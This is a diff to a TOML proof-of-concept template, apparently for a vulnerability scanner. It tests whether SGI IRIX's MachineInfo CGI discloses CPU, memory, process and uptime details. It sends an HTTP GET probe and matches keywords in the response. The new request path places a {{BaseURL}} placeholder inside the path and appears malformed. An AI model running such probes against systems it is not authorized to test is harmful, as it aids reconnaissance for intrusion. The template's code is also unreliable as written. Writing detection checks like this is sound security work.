@@ -1,8 +1,8 @@
 [info]
 author = "ave"
-description = "检测 SGI MachineInfo CGI 程序 (webdist.cgi/machineinfo.cgi) 是否泄露敏感系统状态信息"
+description = "检测 SGI IRIX 服务器上默认安装的 MachineInfo CGI 程序是否存在信息泄露漏洞。攻击者可通过 HTTP GET 请求 /cgi-bin/MachineInfo 获取系统 CPU、内存、进程、网络连接、系统负载等敏感状态信息，为后续渗透提供情报支撑。"
 id = "POC-AVE-1999-1316"
-name = "CVE-1999-1067 PoC"
+name = "SGI MachineInfo CGI 信息泄露漏洞 PoC"
 severity = "medium"
 tags = ["ave-1999-1316"]
 vuln_id = [
@@ -15,7 +15,7 @@ logic = "any"
 
 [[poc.requests]]
 method = "GET"
-path = "/cgi-bin/webdist.cgi"
+path = "/{{BaseURL}}/cgi-bin/MachineInfo"
 protocol = "http"
 
 [[poc.requests.matchers]]
@@ -23,52 +23,9 @@ expect = true
 part = "body"
 type = "word"
 words = [
-    "machineinfo",
-    "system status",
-    "system information",
-    "hostname",
-    "os version",
-    "cpu",
-    "memory",
-    "disk",
-]
-
-[[poc.requests]]
-method = "GET"
-path = "/cgi-bin/machineinfo.cgi"
-protocol = "http"
-
-[[poc.requests.matchers]]
-expect = true
-part = "body"
-type = "word"
-words = [
-    "machineinfo",
-    "system status",
-    "system information",
-    "hostname",
-    "os version",
-    "cpu",
-    "memory",
-    "disk",
-]
-
-[[poc.requests]]
-method = "GET"
-path = "/cgi-bin/webdist.cgi?page=machineinfo"
-protocol = "http"
-
-[[poc.requests.matchers]]
-expect = true
-part = "body"
-type = "word"
-words = [
-    "machineinfo",
-    "system status",
-    "system information",
-    "hostname",
-    "os version",
-    "cpu",
-    "memory",
-    "disk",
+    "CPU",
+    "Memory",
+    "Process",
+    "Uptime",
+    "MachineInfo",
 ]
